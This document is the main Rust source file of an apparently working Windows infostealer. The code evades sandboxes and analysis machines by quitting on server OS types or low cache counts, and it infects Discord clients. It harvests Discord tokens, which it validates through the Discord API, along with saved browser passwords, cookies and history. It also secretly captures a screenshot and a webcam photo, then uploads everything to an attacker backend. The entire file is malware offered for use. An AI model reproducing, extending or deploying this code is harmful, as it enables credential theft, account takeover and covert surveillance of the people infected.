//#![windows_subsystem = "windows"]
mod browser;
mod constants;
mod discord;
use nokhwa::{query_devices, Camera, CaptureAPIBackend};
use reqwest::blocking::multipart;
use screenshots::Screen;
use std::{collections::HashMap, fs, path::PathBuf, process};
use wmi::{COMLibrary, Variant, WMIConnection};

fn capture_screenshot(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let screens = Screen::all();

    if screens.len() > 0 {
        match screens[0].capture() {
            Some(image) => {
                let buffer = image.buffer();
                fs::write(&save_path, &buffer)?;
                return Ok(true);
            }
            None => (),
        };
    }
    return Ok(false);
}

fn capture_webcam_image(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let cameras = query_devices(CaptureAPIBackend::Auto)?;

    if cameras.len() > 0 {
        let mut camera = Camera::new(0, None)?;
        camera.open_stream()?;

        fs::write(&save_path, camera.frame_raw()?)?;
        camera.stop_stream()?;

        return Ok(true);
    }
    return Ok(false);
}

fn detect_analysis_environment() -> Result<(), Box<dyn std::error::Error>> {
    let con = WMIConnection::new(COMLibrary::new()?.into())?;
    let results: Vec<HashMap<String, Variant>> =
        con.raw_query("SELECT ProductType FROM Win32_OperatingSystem")?;

    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                process::exit(0);
            }
        }
    }

    let results: Vec<HashMap<String, Variant>> =
        con.raw_query("SELECT * FROM Win32_CacheMemory")?;

    if results.len() < 2 {
        process::exit(0);
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Method to decrypt analysis environment from https://github.com/qwqdanchun/DcRat
    detect_analysis_environment()?;

    if constants::TRACE_TOKEN {
        // Infects discord clients
        discord::infect_clients()?;
    }

    let temp_env = std::env::temp_dir();

    let mut form = multipart::Form::new()
        .text("webhook", constants::ENCRYPTED_WEBHOOK)
        .text("title", "Information stolen");

    let client = reqwest::blocking::Client::new();

    if constants::STEAL_TOKENS {
        let mut tokens = discord::get_tokens()?;

        // Removes invalid tokens (might get rate limited from discord idk)
        for i in 0..tokens.len() {
            // Gets user data from the token using discord API
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", &tokens[i])
                .send()?;

            if !user_response.status().is_success() {
                tokens.remove(i);
            }
        }

        // If there are any tokens add the first token info to the post request
        if let Some(token) = tokens.first() {
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", token)
                .send()?;
            form = form.text("user", user_response.text()?);

            // Adds the tokens to the request as a text file
            let tokens_temp_path = temp_env.join("tokens.txt");
            fs::write(&tokens_temp_path, tokens.join("\n"))?;
            form = form.file("tokens", &tokens_temp_path)?;
            fs::remove_file(tokens_temp_path)?;
        }
    }

    if constants::STEAL_PASSWORDS {
        // Adds the passwords to the request as a text file
        let passwords_temp_path = temp_env.join("passwords.txt");
        fs::write(&passwords_temp_path, browser::get_passwords()?.join("\n"))?;
        form = form.file("passwords", &passwords_temp_path)?;
        fs::remove_file(passwords_temp_path)?;
    }

    if constants::STEAL_COOKIES {
        // Adds the cookies to the request as a text file
        let cookies_temp_path = temp_env.join("cookies.txt");
        fs::write(&cookies_temp_path, browser::get_cookies()?.join("\n"))?;
        form = form.file("cookies", &cookies_temp_path)?;
        fs::remove_file(cookies_temp_path)?;
    }

    if constants::STEAL_HISTORY {
        // Adds the browsing history to the request as a text file
        let history_temp_path = temp_env.join("history.txt");
        fs::write(&history_temp_path, browser::get_history()?.join("\n"))?;
        form = form.file("history", &history_temp_path)?;
        fs::remove_file(history_temp_path)?;
    }

    if constants::SCREENSHOT {
        // Adds the screenshot to the request if it succeeds
        let screenshot_temp_path = temp_env.join("screenshot.png");

        if capture_screenshot(&screenshot_temp_path)? {
            form = form.file("screenshot", &screenshot_temp_path)?;
            fs::remove_file(screenshot_temp_path)?;
        }
    }

    if constants::WEBCAM_IMAGE {
        // Adds the webcam image to the request if it succeeds
        let webcam_temp_path = temp_env.join("webcam.png");

        if capture_webcam_image(&webcam_temp_path)? {
            form = form.file("webcam", &webcam_temp_path)?;
            fs::remove_file(webcam_temp_path)?;
        }
    }

    // Sends the stolen data to the backend
    client.post(constants::BACKEND).multipart(form).send()?;

    Ok(())
}
